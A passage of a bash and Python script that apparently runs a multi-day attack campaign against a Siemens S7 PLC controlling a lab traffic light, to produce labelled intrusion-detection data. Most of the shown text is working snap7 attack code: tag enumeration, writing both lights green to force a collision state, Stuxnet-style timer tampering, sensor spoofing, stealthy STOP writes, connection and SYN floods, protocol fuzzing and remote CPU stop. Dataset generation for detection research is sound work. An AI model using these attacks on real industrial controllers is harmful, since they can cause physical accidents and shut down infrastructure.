    sleep_range = (0.3, 2.0)
else:
    sleep_range = (0.15, 0.5)
c = snap7.client.Client()
n = 0

try:
    c.connect(target, rack, slot)
    info = c.get_cpu_info()
    print(f"[ENUM] CPU: {info.ModuleTypeName}", flush=True)
    state = c.get_cpu_state()
    print(f"[ENUM] CPU state: {state}", flush=True)
except Exception as e:
    print(f"[ENUM] Info: {e}", flush=True)

print(f"[ENUM] reading M/Q areas profile={profile} sleep={sleep_range}", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        m = c.read_area(Areas.MK, 0, 0, 82)
        try:
            q = c.read_area(Areas.PA, 0, 0, 1)
            q0 = q[0]
        except Exception:
            q0 = -1
        n += 1
        if n % 50 == 0:
            print(f"[ENUM] #{n} M2=0x{m[2]:02X} Q0={q0} TimeG1={get_dint(m,20)}", flush=True)
    except Exception as exc:
        print(f"[ENUM][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        RWRITE_BURST)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
if profile == "day6_robust":
    sleep_range = (5.0, 15.0)
elif profile == "extended_300k":
    sleep_range = (0.3, 1.5)
else:
    sleep_range = (0.08, 0.25)
c = snap7.client.Client()
# Q0 = Running + Green1 + Green2 = collision state
# 0b11000010: bit7=Green2, bit6=Green1, bit1=Running
COLLISION = bytearray([0b11000010])
n = 0
print(f"[RWRITE] Forcing both directions GREEN = COLLISION RISK on PA/Q0 profile={profile} sleep={sleep_range}", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        try:
            old_q0 = c.read_area(Areas.PA, 0, 0, 1)[0]
        except Exception:
            old_q0 = None
        c.write_area(Areas.PA, 0, 0, COLLISION)
        if old_q0 is not None and old_q0 != COLLISION[0]:
            log_attack_event("Q0_PA", area="PA", byte_offset=0, data_type="byte", old_value=old_q0, new_value=COLLISION[0])
        n += 1
        if n % 50 == 0:
            print(f"[RWRITE] {n} writes: Q0=0xC2 (Green1=Green2=1)", flush=True)
    except Exception as exc:
        print(f"[RWRITE][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        SETPOINT_ATTACK)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_dint, set_dint
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
if profile == "day6_robust":
    sleep_range = (20.0, 60.0)
elif profile == "extended_300k":
    sleep_range = (2.0, 10.0)
else:
    sleep_range = (0.4, 1.2)
c = snap7.client.Client()

# Giá trị tấn công: xanh quá ngắn hoặc đỏ quá dài
green_values = [500, 1000, 1500, 2000]       # unsafe short green (bình thường: 25000)
red_values   = [45000, 60000, 90000, 120000]  # unsafe long red (bình thường: 30000)
yellow_values = [500, 1000, 5000, 8000]       # tampered yellow
if profile == "extended_300k":
    green_values = green_values + [100, 250, 3000]
    red_values = red_values + [150000, 180000]
    yellow_values = yellow_values + [100, 15000]

n = 0
print(f"[SETPOINT] Manipulating traffic light timers (Stuxnet-style) profile={profile} sleep={sleep_range}", flush=True)
def write_dint(client, offset, value, signal):
    old = get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)
    buf = bytearray(4)
    set_dint(buf, 0, int(value))
    client.write_area(Areas.MK, 0, offset, buf)
    if old != int(value):
        log_attack_event(signal, area="MK", byte_offset=offset, data_type="dint", old_value=old, new_value=int(value))
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        r1 = random.choice(red_values)
        r2 = random.choice(red_values)
        g1 = random.choice(green_values)
        g2 = random.choice(green_values)
        y1 = random.choice(yellow_values)
        y2 = random.choice(yellow_values)
        write_dint(c,  3, r1, "TimeR1_MS")
        write_dint(c,  8, r2, "TimeR2_MS")
        write_dint(c, 12, y1, "TimeY1_MS")
        write_dint(c, 16, y2, "TimeY2_MS")
        write_dint(c, 20, g1, "TimeG1_MS")
        write_dint(c, 24, g2, "TimeG2_MS")
        n += 1
        if n % 20 == 0:
            print(f"[SETPOINT] #{n} R1={r1} R2={r2} G1={g1} G2={g2} Y1={y1} Y2={y2}", flush=True)
    except Exception as exc:
        print(f"[SETPOINT][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        SENSOR_SPOOF)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
if profile == "day6_robust":
    sleep_range = (15.0, 45.0)
elif profile == "extended_300k":
    sleep_range = (2.0, 8.0)
else:
    sleep_range = (0.4, 1.5)
c = snap7.client.Client()
# M28: s1(b0), s4(b1), s2(b2), s3(b3)
# Spoofed patterns: all sensors active, partial combinations
patterns = [0x0F, 0x0F, 0x0F, 0x0D, 0x0B, 0x07]  # weighted towards all-1
if profile == "extended_300k":
    patterns = patterns + [0x00, 0x05, 0x0A]
n = 0
print(f"[SPOOF] spoofing sensor bits M28 (s1/s2/s3/s4) profile={profile} sleep={sleep_range}", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        val = random.choice(patterns)
        try:
            old_val = c.read_area(Areas.MK, 0, 28, 1)[0]
        except Exception:
            old_val = None
        c.write_area(Areas.MK, 0, 28, bytearray([val]))
        if old_val is not None and old_val != val:
            log_attack_event("M28_sensors", area="MK", byte_offset=28, data_type="byte", old_value=old_val, new_value=val)
        n += 1
        if n % 30 == 0:
            print(f"[SPOOF] #{n} M28=0x{val:02X}", flush=True)
    except Exception as exc:
        print(f"[SPOOF][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        STEALTHY_WRITE)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
if profile == "day6_robust":
    sleep_range = (20.0, 60.0)
elif profile == "extended_300k":
    sleep_range = (5.0, 20.0)
else:
    sleep_range = (1.5, 3.0)
c = snap7.client.Client()
n = 0
print(f"[STEALTHY] low-rate STOP writes on M2.2 profile={profile} sleep={sleep_range}", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        m = c.read_area(Areas.MK, 0, 2, 1)
        old_stop = get_bool(m, 0, 2)
        set_bool(m, 0, 2, True)   # M2.2 = STOP = 1
        new_stop = get_bool(m, 0, 2)
        c.write_area(Areas.MK, 0, 2, m)
        if old_stop != new_stop:
            log_attack_event("M2.2_STOP", area="MK", byte_offset=2, bit_offset=2, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
        n += 1
        if n % 10 == 0:
            print(f"[STEALTHY] #{n} STOP writes", flush=True)
    except Exception as exc:
        print(f"[STEALTHY][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        S7_FLOOD)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import threading
import time

import snap7

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
threads_n = int("$S7_FLOOD_THREADS")
if profile == "day6_robust":
    threads_n = max(1, min(threads_n, 2))
elif profile == "extended_300k":
    threads_n = max(1, min(threads_n, 4))
lock = threading.Lock()
ok = 0
fail = 0
def one_connect():
    global ok, fail
    try:
        c = snap7.client.Client()
        c.connect(target, rack, slot)
        time.sleep(random.uniform(0.03, 0.2))
        c.disconnect()
        with lock:
            ok += 1
            if ok % 100 == 0:
                print(f"[S7_FLOOD] ok={ok} fail={fail}", flush=True)
    except Exception:
        with lock:
            fail += 1
        if profile != "day6_robust":
            time.sleep(random.uniform(0.02, 0.15))
def worker():
    while True:
        if profile == "day6_robust":
            for _ in range(random.randint(3, 8)):
                one_connect()
                time.sleep(random.uniform(0.08, 0.5))
            time.sleep(random.uniform(8.0, 25.0))
        elif profile == "extended_300k":
            for _ in range(random.randint(5, 20)):
                one_connect()
                time.sleep(random.uniform(0.05, 0.3))
            time.sleep(random.uniform(2.0, 8.0))
        else:
            one_connect()
print(f"[S7_FLOOD] {threads_n} Snap7 connection workers profile={profile}", flush=True)
workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads_n)]
for t in workers:
    t.start()
while True:
    time.sleep(1)
PYEOF
            ;;
        SYN_FLOOD)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import socket
import threading
import time

target = "$TARGET_IP"
profile = os.environ.get("ATTACK_PROFILE", "standard")
threads_n = int("$SYN_FLOOD_THREADS")
if profile == "day6_robust":
    threads_n = max(1, min(threads_n, 3))
elif profile == "extended_300k":
    threads_n = max(1, min(threads_n, 6))
def one_connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.08)
        s.connect((target, 102))
        s.close()
    except Exception:
        pass
def worker():
    while True:
        if profile == "day6_robust":
            for _ in range(random.randint(5, 15)):
                one_connect()
                time.sleep(random.uniform(0.05, 0.25))
            time.sleep(random.uniform(8.0, 20.0))
        elif profile == "extended_300k":
            for _ in range(random.randint(10, 30)):
                one_connect()
                time.sleep(random.uniform(0.03, 0.2))
            time.sleep(random.uniform(2.0, 6.0))
        else:
            one_connect()
print(f"[SYN_FLOOD] {threads_n} TCP connect workers on port 102 profile={profile}", flush=True)
workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads_n)]
for t in workers:
    t.start()
while True:
    time.sleep(1)
PYEOF
            ;;
        PROTOCOL_FUZZ)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import socket
import time

target = "$TARGET_IP"
profile = os.environ.get("ATTACK_PROFILE", "standard")
min_len = int("$FUZZ_PAYLOAD_MIN")
max_len = int("$FUZZ_PAYLOAD_MAX")
if profile == "day6_robust":
    sleep_range = (5.0, 20.0)
elif profile == "extended_300k":
    sleep_range = (1.0, 5.0)
else:
    sleep_range = (0.05, 0.25)
n = 0
print(f"[FUZZ] malformed TPKT/S7-like payloads on port 102 profile={profile} sleep={sleep_range}", flush=True)
while True:
    try:
        payload = os.urandom(random.randint(min_len, max_len))
        pkt = b"\x03\x00" + (len(payload) + 4).to_bytes(2, "big") + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((target, 102))
        s.sendall(pkt)
        s.close()
        n += 1
        if n % 50 == 0:
            print(f"[FUZZ] {n} malformed packets", flush=True)
    except Exception:
        pass
    time.sleep(random.uniform(*sleep_range))
PYEOF
            ;;
        CPU_STOP)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import time

import snap7
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
profile = os.environ.get("ATTACK_PROFILE", "standard")
stop_hold_s = 10 if profile == "day6_robust" else 5
cycle_sleep = (45.0, 90.0) if profile == "day6_robust" else (15.0, 15.0)
c = snap7.client.Client()
print(f"[CPU_STOP] enabled by operator; attempting remote STOP/HOT_START profile={profile}", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        c.plc_stop()
        log_attack_event("CPU_STOP", area="CPU", data_type="cpu_command", new_value="STOP", status="command_sent")
        print("[CPU_STOP] STOP sent", flush=True)
        time.sleep(stop_hold_s)
        try:
            c.plc_hot_start()
            log_attack_event("CPU_HOT_START", area="CPU", data_type="cpu_command", new_value="HOT_START", status="command_sent")
            print("[CPU_STOP] HOT_START sent", flush=True)
        except Exception as exc:
            print(f"[CPU_STOP][WARN] HOT_START denied: {exc}", flush=True)
        time.sleep(random.uniform(*cycle_sleep))
    except Exception as exc:
        print(f"[CPU_STOP][WARN] denied or failed: {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(10)
PYEOF
            ;;
        *)
            echo "[ERROR] Unknown scenario: $scenario" >&2
            return 1
            ;;
    esac
    ATTACK_PID="$!"
    PIDS+=("$ATTACK_PID")
}

# ── Orchestration helpers ────────────────────────────────────────

stop_pid() {
    local pid="$1"
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
}

needs_restore() {
    case "$1" in
        RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE|CPU_STOP) return 0 ;;
        *) return 1 ;;
    esac
}

run_attack_episode() {
    local scenario="$1"
    local duration_s="$2"
    local rep="$3"
    local episode_id="${SESSION_ID}:day${DAY}:${scenario}:r${rep}"
    local note="rep=${rep};duration_s=${duration_s};host=${HOST_ID};profile=${ATTACK_PROFILE}"
    local pid

    if [[ "$ATTACK_EVENT_LOG_ENABLED" == "1" ]]; then
        export ATTACK_EVENT_FILE
        ATTACK_EVENT_FILE="$(attack_event_file)"
    else
        export ATTACK_EVENT_FILE=""
    fi
    export ATTACK_EPISODE_ID="$episode_id" ATTACK_SCENARIO="$scenario" ATTACK_DAY="$DAY" SESSION_ID HOST_ID ATTACK_PROFILE

    label "$scenario" "START" "$episode_id" "$note"
    start_attack_process "$scenario"
    pid="$ATTACK_PID"
    wait_s "$duration_s" "$scenario r$rep"
    stop_pid "$pid"
    if needs_restore "$scenario"; then
        restore_plc
    fi
    label "$scenario" "END" "$episode_id" "$note"
}

benign_period() {
    local duration_s="$1"
    local note="${2:-benign}"
    local episode_id="${SESSION_ID}:day${DAY}:BENIGN:${note// /_}"
    label "BENIGN_NORMAL" "START" "$episode_id" "$note"
    wait_s "$duration_s" "$note"
    label "BENIGN_NORMAL" "END" "$episode_id" "$note"
}

reps_for_day() {
    local var="DAY${DAY}_ATTACK_REPETITIONS"
    echo "${!var:-$ATTACK_REPETITIONS}"
}

run_repeated() {
    local scenario="$1"
    local base_duration="${2:-$ATTACK_DURATION_S}"
    local reps="${3:-$ATTACK_REPETITIONS}"
    local rep
    for rep in $(seq 1 "$reps"); do
        run_attack_episode "$scenario" "$(rand_duration "$base_duration")" "$rep"
        benign_period "$(rand_duration "$BENIGN_GAP_S")" "gap_after_${scenario}_r${rep}"
    done
}

# ── Controller ───────────────────────────────────────────────────

run_controller_mixed() {
    local deadline_ms
    deadline_ms=$(( $(now_ms) + $(duration_for_day) * 1000 ))
    start_capture "controller"
    echo "[ctrl] mixed benign profile: normal_hmi -> sparse_hmi -> tia_portal_only -> idle_quiet"
    while true; do
        run_controller_segment_until "$deadline_ms" "normal_hmi" "$CTRL_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "sparse_hmi" "$CTRL_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "tia_portal_only" "$CTRL_TIA_ONLY_S" "1" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "idle_quiet" "$CTRL_IDLE_S" "1" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
    done
}

run_controller_tia_attack() {
    start_capture "controller"
    echo "[ctrl] TIA Portal attack-background profile: no script HMI polling while attacker day6 runs"
    echo "[ctrl] Keep TIA Portal online during this period. Optional tag logger: CTRL_TIA_ATTACK_TAG_LOGGER=$CTRL_TIA_ATTACK_TAG_LOGGER"
    run_controller_segment "tia_portal_attack_background" "$CTRL_TIA_ATTACK_S" "$CTRL_TIA_ATTACK_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
}

run_controller_day4_mixed() {
    local deadline_ms
    deadline_ms=$(( $(now_ms) + $(duration_for_day) * 1000 ))
    start_capture "controller"
    echo "[ctrl] day4 mixed attack-background profile: normal_hmi -> tia_portal -> sparse_hmi -> tia_portal -> normal_hmi -> idle_quiet"
    while true; do
        run_controller_segment_until "$deadline_ms" "day4_normal_hmi_a" "$CTRL_DAY4_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "day4_tia_portal_a" "$CTRL_DAY4_MIXED_TIA_S" "$CTRL_DAY4_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "day4_sparse_hmi" "$CTRL_DAY4_MIXED_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "day4_tia_portal_b" "$CTRL_DAY4_MIXED_TIA_S" "$CTRL_DAY4_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "day4_normal_hmi_b" "$CTRL_DAY4_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "day4_idle_quiet" "$CTRL_DAY4_MIXED_IDLE_S" "1" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
    done
}

run_controller_attack_mixed() {
    local deadline_ms
    deadline_ms=$(( $(now_ms) + $(duration_for_day) * 1000 ))
    start_capture "controller"
    echo "[ctrl] attack-mixed profile for day6: normal_hmi -> sparse_hmi -> tia_portal_only -> idle_quiet while attacker runs"
    while true; do
        run_controller_segment_until "$deadline_ms" "attack_normal_hmi" "$CTRL_ATTACK_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "attack_sparse_hmi" "$CTRL_ATTACK_MIXED_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "attack_tia_portal_only" "$CTRL_ATTACK_MIXED_TIA_ONLY_S" "$CTRL_ATTACK_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
        run_controller_segment_until "$deadline_ms" "attack_idle_quiet" "$CTRL_ATTACK_MIXED_IDLE_S" "$CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
    done
}

run_controller() {
    if [[ "$CONTROLLER_PROFILE" == "mixed" ]]; then
        run_controller_mixed
        return
    fi
    if [[ "$CONTROLLER_PROFILE" == "tia_attack" || "$CONTROLLER_PROFILE" == "tia_portal_attack" ]]; then
        run_controller_tia_attack
        return
    fi
    if [[ "$CONTROLLER_PROFILE" == "day4_mixed" || "$CONTROLLER_PROFILE" == "day4_hmi_tia" ]]; then
        run_controller_day4_mixed
        return
    fi
    if [[ "$CONTROLLER_PROFILE" == "attack_mixed" || "$CONTROLLER_PROFILE" == "day6_mixed" ]]; then
        run_controller_attack_mixed
        return
    fi
    start_capture "controller"
    start_tag_logger
    start_hmi
    benign_period "$(duration_for_day)" "controller_runtime"
}

# ── Attacker per-day schedules ───────────────────────────────────

run_attacker_day1() {
    benign_period "$(duration_for_day)" "attacker_idle_baseline"
}

run_attacker_day2() {
    benign_period "$WARMUP_S" "warmup"
    run_repeated "SCAN_PORT" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
    run_repeated "ENUM_TAGS" "$ATTACK_DURATION_S" "$(reps_for_day)"
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker_day3() {
    benign_period "$WARMUP_S" "warmup"
    if [[ "$ENABLE_CPU_CONTROL_ATTACK" == "1" ]]; then
        run_repeated "CPU_STOP" "$SHORT_ATTACK_DURATION_S" "1"
    else
        echo "[att] CPU_STOP skipped by default. Use --enable-cpu-control only if PLC permits it."
    fi
    if [[ "$ALLOW_PA_WRITE_ATTACKS" == "1" ]]; then
        run_repeated "RWRITE_BURST" "$ATTACK_DURATION_S" "$(reps_for_day)"
    else
        echo "[att] RWRITE_BURST skipped. Use --allow-pa-write-attacks only in a safe lab."
    fi
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker_day4() {
    benign_period "$WARMUP_S" "warmup"
    run_repeated "SETPOINT_ATTACK" "$ATTACK_DURATION_S" "$(reps_for_day)"
    run_repeated "SENSOR_SPOOF" "$ATTACK_DURATION_S" "$(reps_for_day)"
    run_repeated "STEALTHY_WRITE" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker_day5() {
    benign_period "$WARMUP_S" "warmup"
    run_repeated "S7_FLOOD" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
    run_repeated "SYN_FLOOD" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
    run_repeated "PROTOCOL_FUZZ" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
    benign_period "$COOLDOWN_S" "cooldown"
}

mixed_scenarios() {
    local items="SCAN_PORT ENUM_TAGS SETPOINT_ATTACK SENSOR_SPOOF STEALTHY_WRITE S7_FLOOD SYN_FLOOD PROTOCOL_FUZZ"
    if [[ "$ENABLE_CPU_CONTROL_ATTACK" == "1" ]]; then
        items="$items CPU_STOP"
    fi
    if [[ "$ALLOW_PA_WRITE_ATTACKS" == "1" ]]; then
        items="$items RWRITE_BURST"
    fi
    "$PY_CMD" -c "import random,sys; items=sys.argv[1].split(); random.shuffle(items); print(' '.join(items))" "$items"
}

day6_duration_for() {
    case "$1" in
        SCAN_PORT|ENUM_TAGS)
            rand_range "$DAY6_SCAN_ENUM_MIN_S" "$DAY6_SCAN_ENUM_MAX_S"
            ;;
        RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE)
            rand_range "$DAY6_INTEGRITY_MIN_S" "$DAY6_INTEGRITY_MAX_S"
            ;;
        S7_FLOOD|SYN_FLOOD|PROTOCOL_FUZZ)
            rand_range "$DAY6_AVAIL_MIN_S" "$DAY6_AVAIL_MAX_S"
            ;;
        CPU_STOP)
            rand_range "$DAY6_CPU_MIN_S" "$DAY6_CPU_MAX_S"
            ;;
        *)
            rand_duration "$SHORT_ATTACK_DURATION_S"
            ;;
    esac
}

day6_gap() {
    rand_range "$DAY6_GAP_MIN_S" "$DAY6_GAP_MAX_S"
}

run_attacker_day6() {
    local cycle
    local scenario
    local idx=1
    ATTACK_PROFILE="day6_robust"
    export ATTACK_PROFILE
    echo "[att] Day 6 robustness/OOD test: same labels, altered rates, random order, wide gaps"
    benign_period "$WARMUP_S" "warmup"
    for cycle in $(seq 1 "$DAY6_CYCLES"); do
        echo "[att] Day 6 mixed cycle ${cycle}/${DAY6_CYCLES}"
        for scenario in $(mixed_scenarios); do
            run_attack_episode "$scenario" "$(day6_duration_for "$scenario")" "c${cycle}_i${idx}"
            benign_period "$(day6_gap)" "day6_robust_gap_c${cycle}_${idx}"
            idx=$((idx + 1))
        done
    done
    benign_period "$COOLDOWN_S" "cooldown"
}

# ── Attacker dispatcher ─────────────────────────────────────────

run_attacker() {
    start_capture "attacker"
    case "$DAY" in
        1) run_attacker_day1 ;;
        2) run_attacker_day2 ;;
        3) run_attacker_day3 ;;
        4) run_attacker_day4 ;;
        5) run_attacker_day5 ;;
        6) run_attacker_day6 ;;
    esac
}

# ── Main ─────────────────────────────────────────────────────────

validate_capture_config

if [[ "$PREFLIGHT_ENABLED" == "1" ]]; then
    if ! preflight_plc; then
        if [[ "$REQUIRE_PREFLIGHT" == "1" ]]; then
            echo "[ERROR] Preflight failed. Check PLC IP, rack/slot, network, Snap7, and PUT/GET access." >&2
            exit 2
        fi
        echo "[WARN] Preflight failed but REQUIRE_PREFLIGHT=0, continuing." >&2
    fi
fi

if [[ "${PREFLIGHT_ONLY:-0}" == "1" ]]; then
    echo "[preflight] done"
    exit 0
fi

init_role_outputs

case "$ROLE" in
    controller) run_controller ;;
    attacker) run_attacker ;;
esac

echo "=== DONE: day=$DAY role=$ROLE session=$SESSION_ID host=$HOST_ID ==="
